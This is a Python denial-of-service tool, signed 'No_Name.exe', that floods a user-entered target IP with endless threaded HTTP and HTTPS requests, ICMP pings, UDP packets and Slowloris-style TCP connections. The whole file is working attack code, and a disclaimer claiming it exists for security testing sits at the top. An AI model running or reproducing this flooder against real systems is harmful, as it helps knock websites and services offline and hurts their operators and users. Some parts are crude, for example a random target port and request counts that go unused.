import os
import platform
import subprocess
import requests
import threading
import socket
import random
import sys
import time

# Kırmızı rengi tanımla
RED = '\033[91m'
# Sıfırla
RESET = '\033[0m'

# Kırmızı renkte animasyonlu yazıyı göster
def animate_text(text):
    for char in text:
        sys.stdout.write(RED + char + RESET)
        sys.stdout.flush()
        time.sleep(0.1)
    print()

def send_http_request(url):
    while True:
        try:
            response = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=5)
            print(f"HTTP request sent to {url}. Status code: {response.status_code}")
        except Exception as e:
            print(f"Error sending HTTP request to {url}: {str(e)}")

def send_https_request(url):
    while True:
        try:
            response = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=5, verify=False)
            print(f"HTTPS request sent to {url}. Status code: {response.status_code}")
        except Exception as e:
            print(f"Error sending HTTPS request to {url}: {str(e)}")

def send_icmp_traffic(target_ip, num_pings):
    while True:
        try:
            print(f"Sending {num_pings} ICMP ping requests to {target_ip}...")
            if platform.system().lower() == "windows":
                command = ["ping", "-n", str(num_pings), target_ip]
            else:
                command = ["ping", "-c", str(num_pings), target_ip]
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, error = process.communicate()
            print(output.decode())
            print("ICMP ping traffic sent.")
        except Exception as e:
            print(f"Error sending ICMP ping requests: {str(e)}")

def send_udp_traffic(target_ip, port, num_packets):
    while True:
        try:
            print(f"Sending {num_packets} UDP packets to {target_ip} on port {port}...")
            for _ in range(num_packets):
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(b"UDP packet", (target_ip, port))
                sock.close()
            print("UDP packets sent.")
        except Exception as e:
            print(f"Error sending UDP packets: {str(e)}")

def slowloris_attack(target_ip, port, num_connections):
    while True:
        try:
            print(f"Initiating Slowloris attack on {target_ip} with {num_connections} connections...")
            for _ in range(num_connections):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target_ip, port))
                sock.send(b"GET / HTTP/1.1\r\n")
                print(f"Connection {_+1} established.")
            print("Slowloris attack finished.")
        except Exception as e:
            print(f"Error in Slowloris attack: {str(e)}")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_valid_port():
    return random.randint(1025, 65535)

def menu():
    clear_screen()
    print("╔═╗─╔╦═══╗")
    print("║║╚╗║║╔═╗║")
    print("║╔╗╚╝║║─║║")
    print("║║╚╗║║║─║║")
    print("║║─║║║╚═╝║")
    print("╚╝─╚═╩═══╝")
    print("╔═══╦═══╦═══╦═══╦═══╦═══╗")
    print("║╔══╣╔═╗║╔═╗║╔═╗║╔═╗║╔══╝")
    print("║╚══╣╚══╣║─╚╣║─║║╚═╝║╚══╗")
    print("║╔══╩══╗║║─╔╣╚═╝║╔══╣╔══╝")
    print("║╚══╣╚═╝║╚═╝║╔═╗║║──║╚══╗")
    print("╚═══╩═══╩═══╩╝─╚╩╝──╚═══╝")
    print("----------{ By No_Name.exe }----------\n")
    print("\033[91mWARNING: This tool may cause damage to your system.\033[0m")
    print("")

    target_ip = input("Target website IP address: ")
    print("Target IP =>", target_ip)
    num_http_requests = int(input("How many HTTP requests to send: "))
    print("HTTP Requests =>", num_http_requests)
    num_https_requests = int(input("How many HTTPS requests to send: "))
    print("HTTPS Requests =>", num_https_requests)
    num_icmp_pings = int(input("How many ICMP ping requests to send: "))
    print("ICMP ping requests =>", num_icmp_pings)
    target_port = get_valid_port()
    num_udp_packets = int(input("How many UDP packets to send: "))
    print("UDP packets =>", num_udp_packets)
    num_slowloris_connections = int(input("How many Slowloris connections to establish: "))
    
    for _ in range(10):
        threading.Thread(target=send_http_request, args=(f"http://{target_ip}",)).start()
        threading.Thread(target=send_https_request, args=(f"https://{target_ip}",)).start()
        threading.Thread(target=send_icmp_traffic, args=(target_ip, num_icmp_pings)).start()
        threading.Thread(target=send_udp_traffic, args=(target_ip, target_port, num_udp_packets)).start()
        threading.Thread(target=slowloris_attack, args=(target_ip, target_port, num_slowloris_connections)).start()
    
    print("\nAll tasks initiated.")

if __name__ == "__main__":
    clear_screen()
    animate_text("This tool is made for security testing and cybersecurity! We are not responsible for malicious use!")
    time.sleep(5)
    menu()
